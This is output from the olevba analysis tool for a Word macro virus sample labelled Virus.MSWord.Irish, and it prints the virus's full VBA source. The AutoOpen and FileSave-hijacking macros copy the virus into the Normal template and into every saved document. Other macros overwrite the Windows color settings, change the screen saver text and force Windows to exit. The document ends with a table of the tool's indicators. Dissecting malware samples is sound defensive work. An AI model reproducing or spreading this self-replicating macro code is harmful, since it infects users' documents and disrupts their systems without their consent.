olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Irish-10c4c6d16bed6b3bb519df6faff73211722fba52
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Irish-10c4c6d16bed6b3bb519df6faff73211722fba52 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordHelpNT.bas 
in file: Virus.MSWord.Irish-10c4c6d16bed6b3bb519df6faff73211722fba52 - OLE stream: 'Macros/VBA/WordHelpNT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

    On Error Resume Next

    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Scrollbar", "208 227 211", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Background", "0 128 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveTitle", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitle", "128 128 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Menu", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Window", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "WindowFrame", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "MenuText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "TitleText", "255 255 255", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveBorder", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveBorder", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "AppWorkspace", "150 192 157", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Hilight", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "HilightText", "255 255 255", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonFace", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonShadow", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "GrayText", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitleText", "208 227 211", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonHilight", "208 227 211", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonDkShadow", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonLight", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoWindow", "255 255 255", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonAlternateFace", "150 192 157", ""

    WordBasic.SetPrivateProfileString "Boot", "SCRNSAVE.EXE", "C:\WINDOWS\SYSTEM\SCROLL~1.SCR", "C:\WINDOWS\SYSTEM.INI"
    WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "Happy Saint Patties Day ...    CDJ 1995", "C:\WINDOWS\CONTROL.INI"

WordBasic.ExitWindows

End Sub
-------------------------------------------------------------------------------
VBA MACRO AntiVirus.bas 
in file: Virus.MSWord.Irish-10c4c6d16bed6b3bb519df6faff73211722fba52 - OLE stream: 'Macros/VBA/AntiVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim DocName$
Dim i
Dim j
Dim dlg As Object
    On Error Resume Next
    DocName$ = WordBasic.[FileName$]()
    DocName$ = " " + DocName$

    For i = 0 To Len(DocName$) - 1
        If Mid(DocName$, i + 1, 1) = "\" Then j = i
    Next i
    DocName$ = WordBasic.[Right$](DocName$, i - j - 1)



    Rem If this is a first time save, exit to the File Save As dialog   Rem and exit

    If WordBasic.[FileName$]() = DocName$ Then
        Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
        WordBasic.Dialog.FileSaveAs dlg
    Else
        WordBasic.MacroCopy "Normal:AntiVirus", DocName$ + ":AutoOpen"
        WordBasic.MacroCopy "Normal:FileSave", DocName$ + ":AntiVirus"
        WordBasic.MacroCopy "Normal:WordHelp", DocName$ + ":WordHelp"
        WordBasic.MacroCopy "Normal:WordHelpNT", DocName$ + ":WordHelpNT"
        WordBasic.Beep
        If WordBasic.CountMacros(1) < 2 Then
            WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
        Else
            WordBasic.FileSave
        End If
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO WordHelp.bas 
in file: Virus.MSWord.Irish-10c4c6d16bed6b3bb519df6faff73211722fba52 - OLE stream: 'Macros/VBA/WordHelp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    WordBasic.SetProfileString "Colors", "Scrollbar", "208 227 211"
    WordBasic.SetProfileString "Colors", "Background", "0 128 0"
    WordBasic.SetProfileString "Colors", "ActiveTitle", "89 151 100"
    WordBasic.SetProfileString "Colors", "InactiveTitle", "128 128 0"
    WordBasic.SetProfileString "Colors", "Menu", "162 200 169"
    WordBasic.SetProfileString "Colors", "Window", "89 151 100"
    WordBasic.SetProfileString "Colors", "WindowFrame", "0 0 0"
    WordBasic.SetProfileString "Colors", "MenuText", "0 0 0"
    WordBasic.SetProfileString "Colors", "TitleText", "255 255 255"
    WordBasic.SetProfileString "Colors", "ActiveBorder", "162 200 169"
    WordBasic.SetProfileString "Colors", "InactiveBorder", "162 200 169"
    WordBasic.SetProfileString "Colors", "AppWorkspace", "150 192 157"
    WordBasic.SetProfileString "Colors", "Hilight", "89 151 100"
    WordBasic.SetProfileString "Colors", "HilightText", "255 255 255"
    WordBasic.SetProfileString "Colors", "ButtonFace", "162 200 169"
    WordBasic.SetProfileString "Colors", "ButtonShadow", "89 151 100"
    WordBasic.SetProfileString "Colors", "GrayText", "89 151 100"
    WordBasic.SetProfileString "Colors", "ButtonText", "0 0 0"
    WordBasic.SetProfileString "Colors", "InactiveTitleText", "208 227 211"
    WordBasic.SetProfileString "Colors", "ButtonHilight", "208 227 211"
    WordBasic.SetProfileString "Colors", "ButtonDkShadow", "0 0 0"
    WordBasic.SetProfileString "Colors", "ButtonLight", "162 200 169"
    WordBasic.SetProfileString "Colors", "InfoText", "0 0 0"
    WordBasic.SetProfileString "Colors", "InfoWindow", "255 255 255"
    WordBasic.SetProfileString "Colors", "ButtonAlternateFace", "150 192 157"



End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Irish-10c4c6d16bed6b3bb519df6faff73211722fba52 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim DocName$
Dim i
Dim j
    On Error Resume Next
    DocName$ = WordBasic.[FileName$]()
    DocName$ = " " + DocName$

    For i = 0 To Len(DocName$) - 1
        If Mid(DocName$, i + 1, 1) = "\" Then j = i
    Next i
    DocName$ = WordBasic.[Right$](DocName$, i - j - 1)
    WordBasic.MacroCopy DocName$ + ":AutoOpen", "Normal:AntiVirus"
    WordBasic.MacroCopy DocName$ + ":AntiVirus", "Normal:FileSave"
    WordBasic.MacroCopy DocName$ + ":WordHelp", "Normal:WordHelp"
    WordBasic.MacroCopy DocName$ + ":WordHelpNT", "Normal:WordHelpNT"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |SCRNSAVE.EXE        |Executable file name                         |
|IOC       |1.SCR               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

